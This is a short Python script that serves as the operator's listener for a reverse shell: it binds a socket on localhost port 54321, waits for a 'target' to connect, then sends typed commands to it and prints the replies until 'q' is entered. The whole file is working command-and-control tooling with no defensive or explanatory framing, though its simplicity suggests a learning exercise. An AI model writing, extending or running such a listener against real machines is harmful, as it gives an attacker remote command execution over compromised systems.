import socket

sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sc.bind(("127.0.0.1", 54321))
sc.listen(5)
print("Listening for Incoming connection")
target, ip = sc.accept()
print("Target connected")
while True:
    message = input("* Shell ~%s:" % str(ip))
    bytes1 = bytes(message, 'utf-8')
    exit1 = bytes1.decode("utf-8")
    target.send(bytes1)

    if exit1 == "q":
        break
    else:
        answer = target.recv(1024)
        exit1 = answer.decode("utf-8")
        print(exit1)
sc.close()
